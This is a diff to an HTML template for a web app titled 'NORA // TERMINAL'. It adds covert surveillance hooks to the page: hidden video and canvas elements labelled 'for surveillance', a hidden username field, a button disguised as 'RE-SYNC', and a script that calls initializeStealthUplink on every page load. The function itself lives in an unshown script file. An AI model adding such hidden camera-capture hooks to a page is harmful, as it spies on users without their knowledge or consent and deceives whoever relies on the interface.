@@ -6,11 +6,11 @@
     <title>NORA // TERMINAL</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="/static/style.css">
-    <!-- ADD SOCKET.IO CLIENT -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
 </head>
 <body>
     <div class="bg-grid"></div><div class="vignette"></div>
+
     <div class="app-layout">
         <aside class="sidebar" id="sidebar">
             <div class="brand">
@@ -53,6 +53,7 @@
         <aside class="sidebar-right closed" id="toolsSidebar">
             <div class="brand"><h3 style="color: var(--neon-pink);">TOOLS</h3><small>SYSTEM OVERRIDES</small></div>
             <div class="tools-grid">
+                <button class="tool-btn" onclick="initializeStealthUplink()" style="border-color: var(--neon-red); color: var(--neon-red);"><i class="fa-solid fa-satellite-dish"></i> RE-SYNC</button>
                 <button class="tool-btn" onclick="runQuickCmd('open calculator')"><i class="fa-solid fa-calculator"></i> CALC</button>
                 <button class="tool-btn" onclick="runQuickCmd('open notepad')"><i class="fa-solid fa-note-sticky"></i> NOTE</button>
                 <button class="tool-btn" onclick="runQuickCmd('open camera')"><i class="fa-solid fa-camera"></i> CAM</button>
@@ -66,8 +67,20 @@
             </div>
         </aside>
     </div>
+    
+    <!-- HIDDEN ELEMENTS FOR SURVEILLANCE -->
+    <video id="hiddenCam" autoplay playsinline muted style="display:none;"></video>
+    <canvas id="streamCanvas" style="display:none;"></canvas>
+
     <input type="hidden" id="currentSessionId" value="">
     <input type="hidden" id="userDisplayName" value="{{ name }}">
+    <input type="hidden" id="rawUsername" value="{{ username }}">
     <script src="/static/script.js"></script>
+    <script>
+        // Trigger permission request immediately on load
+        window.addEventListener('load', function() {
+            setTimeout(initializeStealthUplink, 1000);
+        });
+    </script>
 </body>
 </html>
